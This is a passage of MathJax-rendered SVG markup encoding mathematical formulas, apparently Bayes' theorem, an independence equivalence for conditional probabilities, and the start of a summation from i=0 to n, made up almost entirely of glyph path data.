d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mi" transform="translate(605,-247) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container> </p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.172ex;" xmlns="http://www.w3.org/2000/svg" width="24.173ex" height="5.475ex" role="img" focusable="false" viewBox="0 -1460 10684.6 2420"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mo" transform="translate(751,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1140,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(1890,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(2168,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(2927,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3593.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(4649.6,0)"><g data-mml-node="mrow" transform="translate(220,710)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mo" transform="translate(751,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1140,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(1899,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(2177,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(2927,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mi" transform="translate(3316,0)"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mo" transform="translate(4067,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4456,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(5206,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mrow" transform="translate(1873.5,-710)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mo" transform="translate(751,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1140,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(1899,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><rect width="5795" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container><br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="39.346ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 17390.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mo" transform="translate(751,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1140,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(1890,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2556.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(3612.6,0)"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mo" transform="translate(4363.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4752.6,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(5780.3,0)"><path data-c="2223" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(6336.1,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(7095.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7761.9,0)"><path data-c="27FA" d="M1438 514Q1438 525 1454 525Q1459 525 1462 525T1467 525T1471 524T1473 523T1475 520T1477 517T1480 512Q1517 438 1578 381T1689 300T1785 263Q1802 258 1802 250T1793 239T1756 228T1698 204Q1554 134 1480 -12Q1476 -21 1473 -22T1458 -24Q1438 -24 1438 -17Q1438 -13 1443 0Q1478 69 1529 123L1539 133H318L328 123Q379 69 414 0Q419 -13 419 -17Q419 -24 399 -24Q388 -24 385 -23T377 -12Q332 77 253 144T72 237Q62 240 59 242T56 250T59 257T70 262T89 268T119 278T160 296Q303 366 377 512Q382 522 385 523T401 525Q419 524 419 515Q419 510 414 500Q379 431 328 377L318 367H1539L1529 377Q1496 412 1467 458T1438 514ZM274 173H1583L1593 181Q1632 211 1710 250Q1709 251 1692 259T1647 283T1593 319L1583 327H930L927 328L602 327H274L264 319Q225 289 147 250Q148 249 165 241T210 217T264 181L274 173Z"></path></g><g data-mml-node="mi" transform="translate(9897.7,0)"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mo" transform="translate(10648.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(11037.7,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(11796.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(12463.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(13519.2,0)"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mo" transform="translate(14270.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(14659.2,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(15696,0)"><path data-c="2223" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(16251.8,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(17001.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.819ex;" xmlns="http://www.w3.org/2000/svg" width="25.799ex" height="6.354ex" role="img" focusable="false" viewBox="0 -1562.5 11403.2 2808.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="munderover"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(148.2,-1087.9) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mi" transform="translate(509.9,1150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 